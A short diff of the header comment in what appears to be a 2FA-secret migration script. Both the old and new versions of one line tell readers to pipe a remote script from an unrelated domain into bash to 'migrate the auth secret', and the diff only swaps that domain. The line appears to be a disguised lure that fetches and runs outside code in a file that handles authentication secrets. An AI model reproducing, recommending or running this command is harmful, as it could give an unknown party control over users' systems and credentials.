@@ -1,5 +1,5 @@
 /**
- * Use this command to automatically migrate the auth secret: curl -sSL https://hpanel.regz.lk/security/0.29.3.sh | bash
+ * Use this command to automatically migrate the auth secret: curl -sSL https://dash.regz.lk/security/0.29.3.sh | bash
  * Migration script: re-encrypt 2FA secrets after rotating BETTER_AUTH_SECRET.
  *
  * Usage:
